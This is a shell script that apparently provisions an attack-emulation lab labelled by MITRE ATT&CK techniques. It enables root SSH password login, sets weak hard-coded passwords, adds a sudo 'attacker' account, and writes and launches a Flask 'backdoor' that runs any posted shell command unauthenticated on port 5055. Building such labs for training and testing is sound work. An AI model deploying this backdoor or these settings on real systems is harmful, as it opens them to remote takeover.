############### SHADOWRAY
#
## Global commands
#
apt-get update
apt-get install -y python3 python3-pip sshpass curl socat wget

## SSH
apt-get install -y openssh-server
mkdir -p /var/run/sshd
echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

pgrep -x "sshd" > /dev/null || /usr/sbin/sshd & 


# Root password
echo 'root:RootPass123' | chpasswd

# User attacker

useradd -m attacker -s /bin/bash
mkdir -p /home/attacker
echo 'attacker:Passw0rd' | chpasswd
usermod -aG sudo attacker

# DebianUser
useradd -M  DebianUser
mkdir -p /home/DebianUser
echo 'DebianUser:DebianUser' | chpasswd
(echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser

pgrep -x "php-fpm8.4" > /dev/null || php-fpm8.4 &

################################################ End of Global Section
# T1190
pip3 install --break-system-packages flask flask-cors requests
mkdir -p /home/attacker/malware
cat > /home/attacker/malware/backdoor.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)
@app.route("/exec", methods=["POST"])
def exec_cmd():
 import subprocess
 cmd = request.form.get("cmd")
 if not cmd:
  return "No command", 400
 try:
  output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
  return output
 except Exception as e:
  return str(e), 500
if __name__ == "__main__":
 app.run(host="0.0.0.0", port=5055)
EOF
chown attacker:attacker /home/attacker/malware/backdoor.py
chmod +x /home/attacker/malware/backdoor.py

if ! ss -tuln | grep -q ":5055 "; then
 su attacker -c "python3 /home/attacker/malware/backdoor.py &"
 else echo "Port 5055 already in use";
fi

# T1027.013
echo 'print("hello")' | base64 > /tmp/encoded_payload.b64


################################
